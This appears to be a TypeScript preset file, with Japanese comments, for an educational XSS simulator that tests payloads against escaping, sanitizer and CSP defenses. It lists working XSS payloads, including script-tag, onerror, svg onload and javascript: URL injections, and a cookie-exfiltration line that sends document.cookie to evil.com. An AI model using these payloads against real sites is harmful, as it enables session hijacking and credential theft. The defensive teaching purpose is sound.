/* XSS シミュレーター プリセット */

import type { Preset, SimOp } from "./types.js";
import { noDefense, htmlEscapeOnly, fullEscape, withSanitizer, withCsp, fullDefense, mkPayload } from "./engine.js";

export const PRESETS: Preset[] = [
  {
    name: "Reflected XSS 基本",
    description: "防御なしのページへの基本的なReflected XSS攻撃",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert("XSS")</script>', "scriptタグ注入", "スクリプト実行"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<img src=x onerror="alert(document.cookie)">', "imgタグonerror", "Cookie窃取"),
        pageConfig: noDefense(),
      },
    ],
  },
  {
    name: "属性インジェクション",
    description: "HTML属性値へのペイロード注入（属性値エスケープ突破）",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "reflected", context: "html_attribute",
        payload: mkPayload('" onfocus="alert(1)" autofocus="', "属性値からの脱出", "イベントハンドラ挿入"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_attribute",
        payload: mkPayload('"><script>alert(1)</script>', "属性値→scriptタグ", "タグ注入"),
        pageConfig: noDefense(),
      },
    ],
  },
  {
    name: "javascript: URL",
    description: "href属性へのjavascript:プロトコル注入",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "reflected", context: "href_attribute",
        payload: mkPayload("javascript:alert(document.cookie)", "javascript:プロトコル", "Cookie窃取"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "href_attribute",
        payload: mkPayload("javascript:alert(document.cookie)", "javascript:プロトコル (URLエンコードあり)", "Cookie窃取"),
        pageConfig: { ...noDefense(), encoding: { ...noDefense().encoding, urlEncode: true } },
      },
    ],
  },
  {
    name: "スクリプトコンテキスト",
    description: "JavaScript文字列内へのインジェクション",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "reflected", context: "script_string",
        payload: mkPayload('";alert(1);//', "文字列からの脱出", "スクリプト実行"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "script_string",
        payload: mkPayload('</script><script>alert(1)</script>', "scriptタグクローズ", "新スクリプト注入"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "script_string",
        payload: mkPayload('";alert(1);//', "文字列脱出（JSエスケープあり）", "スクリプト実行"),
        pageConfig: { ...noDefense(), encoding: { ...noDefense().encoding, jsEscape: true } },
      },
    ],
  },
  {
    name: "DOM-based XSS",
    description: "クライアント側のDOM操作(innerHTML)による攻撃",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "dom_based", context: "url_param",
        payload: mkPayload('<img src=x onerror="alert(1)">', "URLパラメータ→innerHTML", "DOM操作経由の実行"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "dom_based", context: "url_param",
        payload: mkPayload('<svg onload="alert(document.cookie)">', "SVG onload", "Cookie窃取"),
        pageConfig: noDefense(),
      },
    ],
  },
  {
    name: "Stored XSS",
    description: "データベースに保存された攻撃ペイロードの表示",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "stored", context: "html_body",
        payload: mkPayload('<script>fetch("https://evil.com/?c="+document.cookie)</script>', "Cookie外部送信", "セッションハイジャック"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "stored", context: "html_body",
        payload: mkPayload('<script>fetch("https://evil.com/?c="+document.cookie)</script>', "Cookie外部送信（HTMLエスケープあり）", "セッションハイジャック"),
        pageConfig: htmlEscapeOnly(),
      },
    ],
  },
  {
    name: "HTMLエスケープ防御",
    description: "HTMLエスケープによる防御効果の検証",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "scriptタグ（防御なし）", "基準"),
        pageConfig: noDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "scriptタグ（HTMLエスケープ）", "エスケープ効果"),
        pageConfig: htmlEscapeOnly(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "scriptタグ（フルエスケープ）", "エスケープ効果"),
        pageConfig: fullEscape(),
      },
    ],
  },
  {
    name: "サニタイザー防御",
    description: "入力サニタイザーによるタグ・属性除去の検証",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "scriptタグ（サニタイザーあり）", "サニタイザー検証"),
        pageConfig: withSanitizer(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<img src=x onerror="alert(1)">', "imgタグonerror（サニタイザーあり）", "属性ブロック検証"),
        pageConfig: withSanitizer(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<svg onload="alert(1)">', "SVG（サニタイザーあり）", "タグブロック検証"),
        pageConfig: withSanitizer(),
      },
    ],
  },
  {
    name: "CSP 防御",
    description: "Content Security Policyによるインラインスクリプトブロック",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "scriptタグ（CSPあり）", "CSP検証"),
        pageConfig: withCsp(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "scriptタグ（CSP unsafe-inline）", "unsafe-inline検証"),
        pageConfig: {
          ...withSanitizer(),
          csp: { enabled: true, defaultSrc: ["'self'"], scriptSrc: ["'self'", "'unsafe-inline'"], styleSrc: ["'self'"], imgSrc: ["'self'"], connectSrc: ["'self'"] },
        },
      },
    ],
  },
  {
    name: "多層防御",
    description: "エスケープ + サニタイザー + CSP + HttpOnly の全防御",
    build: (): SimOp[] => [
      {
        type: "attack", xssType: "stored", context: "html_body",
        payload: mkPayload('<script>fetch("https://evil.com/?c="+document.cookie)</script>', "全攻撃ベクトル（フル防御）", "全防御検証"),
        pageConfig: fullDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "html_attribute",
        payload: mkPayload('" onfocus="alert(document.cookie)" autofocus="', "属性脱出（フル防御）", "全防御検証"),
        pageConfig: fullDefense(),
      },
      {
        type: "attack", xssType: "reflected", context: "href_attribute",
        payload: mkPayload("javascript:alert(document.cookie)", "javascript: URL（フル防御）", "全防御検証"),
        pageConfig: fullDefense(),
      },
    ],
  },
];
